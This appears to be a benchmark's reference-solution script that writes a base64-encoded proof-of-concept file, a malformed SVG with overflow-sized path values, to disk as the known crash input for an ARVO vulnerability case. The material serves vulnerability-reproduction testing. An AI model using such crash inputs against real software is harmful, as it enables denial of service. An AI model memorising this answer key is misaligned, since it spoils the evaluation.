#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit e468db26 addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
PHN2ZyB2aWV3Qm94PSJxc2hhcnIsIDlFbGUvN0MvIj5hXDU8cGF0aCBzdHJva2U9IiMwMTAiIGQ9Ik0wLS0yMTQ3NDgzNiA5MC1UNDkgUT49c3QgOTAtNzIxNDc0ODM2IDkwLVQ0OSA5MC1RSi0tOSA5MC1UezgyLTUiIHl6PSIiIHN0cm9rZS1kYXNoYXJyYXk9IjVyIDYxDS0iLz48L3N2Zz4=
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
